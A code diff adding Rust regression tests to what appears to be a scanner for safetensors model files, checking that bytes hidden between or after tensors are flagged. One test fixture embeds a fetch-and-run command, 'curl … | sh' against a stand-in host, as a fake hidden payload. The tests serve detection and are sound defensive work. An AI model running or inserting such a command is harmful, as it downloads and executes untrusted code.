@@ -793,3 +793,105 @@ fn verify_on_an_unsigned_model_is_quiet_and_passes() {
     );
     let _ = std::fs::remove_dir_all(&dir);
 }
+
+// ===========================================================================
+// Byte accounting: bytes that belong to no tensor
+// ===========================================================================
+
+/// Two tensors with `payload` wedged in the hole between them. The header is
+/// valid, every offset is in bounds, nothing overlaps: the only thing wrong
+/// with this file is that it carries bytes no tensor claims.
+fn safetensors_with_gap(payload: &[u8]) -> Vec<u8> {
+    let gap = payload.len();
+    let header = format!(
+        "{{\"a\":{{\"dtype\":\"F32\",\"shape\":[1],\"data_offsets\":[0,4]}},\
+          \"b\":{{\"dtype\":\"F32\",\"shape\":[1],\"data_offsets\":[{},{}]}}}}",
+        4 + gap,
+        8 + gap
+    );
+    let mut data = 1.0f32.to_le_bytes().to_vec();
+    data.extend_from_slice(payload);
+    data.extend_from_slice(&2.0f32.to_le_bytes());
+    safetensors(&header, &data)
+}
+
+/// The B1 regression: a payload hidden between two tensors used to scan clean.
+#[test]
+fn a_payload_hidden_between_tensors_fails_the_gate() {
+    let dir = tmpdir("gap");
+    let p = write(
+        &dir,
+        "model.safetensors",
+        &safetensors_with_gap(b"\x7fELFcurl https://evil.example/x.sh | sh"),
+    );
+
+    let (code, out) = run(&["scan", p.to_str().unwrap(), "--fail-on", "high"]);
+    assert_eq!(code, 1, "hidden bytes must fail the gate\n{out}");
+    assert!(out.contains("ST_UNREFERENCED_BYTES"), "{out}");
+    assert!(out.contains("an ELF executable"), "{out}");
+    assert!(out.contains("UNTRUSTED"), "{out}");
+    let _ = std::fs::remove_dir_all(&dir);
+}
+
+/// Same file, machine-readable: the region must be locatable from the report.
+#[test]
+fn the_report_locates_hidden_bytes_precisely() {
+    let dir = tmpdir("gap-json");
+    let payload = b"\x7fELFhidden payload";
+    let p = write(&dir, "model.safetensors", &safetensors_with_gap(payload));
+
+    let (_code, out) = run(&["scan", p.to_str().unwrap(), "--json"]);
+    let v: serde_json::Value = serde_json::from_str(&out).unwrap();
+    let f = v["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|f| f["id"] == "ST_UNREFERENCED_BYTES")
+        .expect("finding");
+    assert_eq!(f["severity"], "high");
+
+    let evidence = f["evidence"].as_array().unwrap()[0].as_str().unwrap();
+    let range = evidence.split("file offsets ").nth(1).unwrap();
+    let start: usize = range.split("..").next().unwrap().parse().unwrap();
+    let end: usize = range.split("..").nth(1).unwrap().trim().parse().unwrap();
+    let bytes = std::fs::read(&p).unwrap();
+    assert_eq!(&bytes[start..end], payload, "reported range must be exact");
+    let _ = std::fs::remove_dir_all(&dir);
+}
+
+/// The B2 sibling: anything appended after the last tensor is caught too.
+#[test]
+fn data_appended_after_the_last_tensor_fails_the_gate() {
+    let dir = tmpdir("tail");
+    let header = "{\"a\":{\"dtype\":\"F32\",\"shape\":[1],\"data_offsets\":[0,4]}}";
+    let mut data = 1.0f32.to_le_bytes().to_vec();
+    data.extend_from_slice(b"PK\x03\x04");
+    data.extend_from_slice(&[0x41; 256]);
+    let p = write(&dir, "model.safetensors", &safetensors(header, &data));
+
+    let (code, out) = run(&["scan", p.to_str().unwrap(), "--fail-on", "high"]);
+    assert_eq!(code, 1, "appended data must fail the gate\n{out}");
+    assert!(out.contains("a ZIP archive"), "{out}");
+    assert!(out.contains("after the last tensor"), "{out}");
+    let _ = std::fs::remove_dir_all(&dir);
+}
+
+/// The invariant must not fire on well-formed files: real writers pack tensors
+/// contiguously, so a normal model stays clean and silent.
+#[test]
+fn a_normally_packed_model_stays_clean() {
+    let dir = tmpdir("packed");
+    let buf = safetensors_f32(&[
+        ("model.layers.0.w", vec![1.0, 2.0, 3.0, 4.0]),
+        ("model.layers.1.w", vec![5.0, 6.0, 7.0, 8.0]),
+    ]);
+    let p = write(&dir, "model.safetensors", &buf);
+
+    let (code, out) = run(&["scan", p.to_str().unwrap(), "--fail-on", "high"]);
+    assert_eq!(code, 0, "{out}");
+    assert!(
+        !out.contains("ST_UNREFERENCED_BYTES"),
+        "false positive:\n{out}"
+    );
+    let _ = std::fs::remove_dir_all(&dir);
+}
